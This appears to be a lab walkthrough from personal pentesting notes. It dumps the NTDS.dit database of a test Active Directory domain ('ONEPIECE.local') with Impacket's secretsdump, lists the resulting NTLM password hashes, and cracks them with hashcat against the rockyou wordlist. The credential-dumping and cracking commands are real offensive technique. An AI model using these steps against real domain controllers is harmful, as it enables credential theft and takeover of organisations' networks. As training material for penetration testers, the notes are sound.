# I. Dumping the NTDS.dit

The NITDS.dit is a databes used to store AD data. This includes:

- User Information
- Group Information
- Security Descriptors
- Password Hashes

We can simply use secretsdump against the DC to perform this attack.

On the Kali box, let’s use secretsdump together with the new user created in the token impersonation attack.

`secretsdump.py <DOMAIN>/user:'password'@<DC-IP>`

This will dump a lot of useful information, including SAM hashes.

```bash
┌──(kali㉿kali)-[~]
└─$ secretsdump.py ONEPIECE.local/brook:'Password1@'@10.0.2.8
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xd37585e1bfc2f539e963038b37cc0bb7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b5eb83f085bd62f2488424b9999dea3c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

The information we’re looking for though is the NTDS.dit secrets.

We can dump just the NTDS.dit with `secretsdump.py <DOMAIN>/user:'password'@<DC-IP> -just-dc-ntlm`:

```bash
──(kali㉿kali)-[~]
└─$ secretsdump.py ONEPIECE.local/brook:'Password1@'@10.0.2.8 -just-dc-ntlm
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b5eb83f085bd62f2488424b9999dea3c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f8bf37c04c80ab31f2e62a0a386e48c:::
ONEPIECE.local\M.D.Luffy:1103:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
ONEPIECE.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
ONEPIECE.local\R.Zoro:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
ONEPIECE.local\Franky:1115:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
ONEPIECE.local\Usopp:1116:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
BxSerFwpoA:1119:aad3b435b51404eeaad3b435b51404ee:d1de872b5aad73477fe42f7af8a42d78:::
fRGOqlTyCl:1120:aad3b435b51404eeaad3b435b51404ee:2959218c8910e1e1b523f0789b544a89:::
brook:1121:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
STRAWHATS-PC$:1000:aad3b435b51404eeaad3b435b51404ee:86d1ca7ab6cd58c374a3517196909e57:::
FRANKY$:1117:aad3b435b51404eeaad3b435b51404ee:ba1fd33af3188537378b74bc188a10f5:::
USOPP$:1118:aad3b435b51404eeaad3b435b51404ee:2800be0cc3c8d966b84641a6730eb0f3:::

```

Next, the most important user we want to crack is the Administrator:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b5eb83f085bd62f2488424b9999dea3c:::

```

To do this, all we need is the NT part (second half) of the hash.

Before that, there’s a neat trick to order the NTDS.dit secrets by copying them, opening Excel, pasting them in the spreadsheet > `Data` > `Text to Columns` > `Delimited` > `Next` > `Select Other` > `Type : in the text box` > `Next` > `Finish`.

![excel 1.png](I%20Dumping%20the%20NTDS%20dit%2038b453dab8b049fe86f5c2705cec4537/excel_1.png)

![excel 2.png](I%20Dumping%20the%20NTDS%20dit%2038b453dab8b049fe86f5c2705cec4537/excel_2.png)

![excel 3.png](I%20Dumping%20the%20NTDS%20dit%2038b453dab8b049fe86f5c2705cec4537/excel_3.png)

![excel 4.png](I%20Dumping%20the%20NTDS%20dit%2038b453dab8b049fe86f5c2705cec4537/excel_4.png)

Everything is nicely ordered.

Put the second half of the hashes in a text file `ntds.txt`.

Finally use hashcat to crack the hashes.

 `hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt`

![ntds1.png](I%20Dumping%20the%20NTDS%20dit%2038b453dab8b049fe86f5c2705cec4537/ntds1.png)